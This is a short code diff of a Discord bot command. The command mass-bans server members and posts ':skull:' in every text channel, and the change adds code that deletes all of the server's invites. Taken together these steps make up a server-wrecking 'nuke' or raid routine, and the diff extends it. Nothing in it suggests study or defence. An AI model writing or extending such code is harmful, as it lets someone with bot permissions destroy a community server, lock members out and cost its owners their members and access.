@@ -41,13 +41,19 @@ module.exports = {
                     await message.channel.send(`(${count}/${total}) Successfully banned ${anornot} ${a} user <@${member.user.id}>!`);
                 })
             })
-
+            
             await message.guild.channels.fetch().then(channels => {
                 channels.forEach(async channel => {
                     if (channel.type !== "GUILD_TEXT") return;
                     console.log(channel.type)
                     let C = await message.client.channels.cache.get(channel.id);
                     await C.send(":skull:");
+                })
+            })
+
+            await message.guild.invites.fetch().then(invites => {
+                invites.forEach(async invite => {
+                    invite.delete();
                 })
             })
         })();
